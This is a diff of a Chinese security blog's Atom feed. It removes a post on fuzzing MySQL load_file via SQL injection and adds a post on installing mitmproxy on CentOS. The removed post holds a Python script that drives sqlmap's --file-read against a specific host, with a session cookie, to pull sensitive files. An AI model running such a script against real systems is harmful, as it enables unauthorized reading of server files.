@@ -426,39 +426,6 @@ W/System.err(<span class="number">24780</span>):    <span class="keyword">at</sp
   </entry>
   
   <entry>
-    <title><![CDATA[sql注入load_file fuzz]]></title>
-    <link href="http://xdxd.love/2016/04/05/sql%E6%B3%A8%E5%85%A5load-file-fuzz/"/>
-    <id>http://xdxd.love/2016/04/05/sql注入load-file-fuzz/</id>
-    <published>2016-04-05T06:06:16.000Z</published>
-    <updated>2016-04-05T06:22:18.000Z</updated>
-    <content type="html"><![CDATA[<p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。</p>
-<p>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：<a href="http://danqingdani.blog.163.com/blog/static/186094195201322811145735/" target="_blank" rel="external">SQLNuke——mysql 注入load_file Fuzz工具</a>.</p>
-<p>不过sqlnuke看说明只支持回显的union的的方式。写一个下脚本用sqlmap来fuzz load_file也是一个不错的方式。</p>
-<pre><code><span class="comment">#!/usr/bin/env python</span>
-<span class="comment"># encoding: utf-8</span>
-import subprocess
-filepaths = <span class="keyword">open</span>(<span class="string">'filelist.txt'</span>)
-<span class="keyword">for</span> filepath in filepaths:
-    cmdline = <span class="string">"python /Users/xxxxxx/security/web/sqlmap/sqlmap.py -u 'http://1.1.25.41/cms/privilege/publist?level=3&amp;title=jj' --cookie='_pss=PcqD<span class="variable">%2BvOIi05CQLYgBqHVE</span><span class="variable">%2Bm9oeAswCYOYYyZZTA0b4wk8KUMrHTuBJmyyZdqch</span><span class="variable">%2Fpwd</span><span class="variable">%2F7QcVCaehUtF0QHhpgkJliaAruL0dxGR</span><span class="variable">%2B8mwM0</span><span class="variable">%2FGc</span><span class="variable">%3D</span>' --batch --file-read="</span> +filepath
-    fuzzsqlmap_proc = subprocess.Popen(cmdline,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-    <span class="keyword">print</span> filepath
-    process_output = fuzzsqlmap_proc.stdout.readlines()
-    <span class="keyword">print</span> process_output
-</code></pre><p>使用python，几行代码就可以搞定。然后到sqlmap输出目录里根据文件大小查看下载下来的文件就可以了。感觉，根据目标系统的环境，搭建一个一样的系统，然后列出所有的文件作为字典来进行fuzz应该是一个不错的思路。</p>
-<p>尝试load_file(目录)，返回为null，如果可以load_file目录的话~~</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。</p>
-<p>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：<a href="http://danqingdani.b]]>
-    </summary>
-    
-      <category term="sql注入" scheme="http://xdxd.love/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[bugfree任意文件上传漏洞]]></title>
     <link href="http://xdxd.love/2016/03/28/bugfree%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%BC%A4%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
     <id>http://xdxd.love/2016/03/28/bugfree任意文件伤上传漏洞/</id>
@@ -1008,6 +975,46 @@ select_expr [, select_expr ...]
     </summary>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[centos 6安装mitmproxy]]></title>
+    <link href="http://xdxd.love/2016/02/26/centos-6%E5%AE%89%E8%A3%85mitmproxy/"/>
+    <id>http://xdxd.love/2016/02/26/centos-6安装mitmproxy/</id>
+    <published>2016-02-26T07:18:01.000Z</published>
+    <updated>2016-03-02T07:07:45.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
+<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用Python开发，是辅助web开发&amp;测试，移动端调试，渗透测试的工具。</p>
+<p>mitmproxy作为定制化工具开发比较方便。但是mitmproxy需要太多依赖了。在mac上使用编译好的执行程序还是比较方便，ubuntu按照官方说明也比较方便安装。</p>
+<p>ubuntu上安装命令如下：</p>
+<pre><code>$ sudo apt-<span class="built_in">get</span> install python-pip python-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> libssl-<span class="built_in">dev</span> libxml2-<span class="built_in">dev</span> libxslt1-<span class="built_in">dev</span>
+$ sudo pip install mitmproxy
+</code></pre><p>mitmproxy官方没有在centos上的安装说明。在centos6.7上安装失败多次，最后按照<a href="http://pacess.blogspot.com/2014/11/install-mitmproxy-on-centos.html" target="_blank" rel="external">在 CentOS 下安裝 mitmproxy</a>的说明，安装成功。</p>
+<pre><code>試過幾次失敗後，最終都能成功安裝在 CentOS <span class="number">6</span>。問題是出在 Python <span class="number">2.6</span> 及 Python <span class="number">3.4</span>。原來「mitmproxy」在 Python <span class="number">2.7</span> 才能順利安裝。要是使用 CentOS <span class="number">7</span> 的話，隨機附送的就是 Python <span class="number">2.7</span>。安裝「mitmproxy」的步驟如下：
+<span class="number">1.</span> 下載 Python 的 PIP 工具
+    wget https:<span class="comment">//bootstrap.pypa.io/get-pip.py</span>
+<span class="number">2.</span> 安裝 Python <span class="number">2.7</span> 的 PIP
+    python get-pip.py
+<span class="number">3.</span> 下載 Python 的 EZ Setup
+    wget https:<span class="comment">//bitbucket.org/pypa/setuptools/raw/bootstrap/ez_setup.py</span>
+<span class="number">4.</span> 安裝 Python <span class="number">2.7</span> 的 EZ Setup
+    python ez_setup.py
+<span class="number">5.</span> 安裝需要的封包
+    yum -y install python-pyasn1 python-flask python-urwid readline-devel gdbm-devel bzip2-devel ncurses-devel sqlite-devel tk-devel gcc python-setuptools python-pip python27-pip newt-python python-devel python27-devel python-pyasn1 pyOpenSSL gcc libxml2-devel libxslt-devel libffi-devel openssl-devel
+<span class="number">6.</span> 安裝 pyOpenSSL <span class="number">0.14</span>
+    easy_install http:<span class="comment">//pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.12.tar.gz</span>
+</code></pre><p>最后 pip install mitmporxy 就好。</p>
+<p><img src="/images/mitmproxy1.JPG" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
+<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用P]]>
+    </summary>
+    
+      <category term="mitmproxy" scheme="http://xdxd.love/tags/mitmproxy/"/>
+    
+      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
     
   </entry>
   
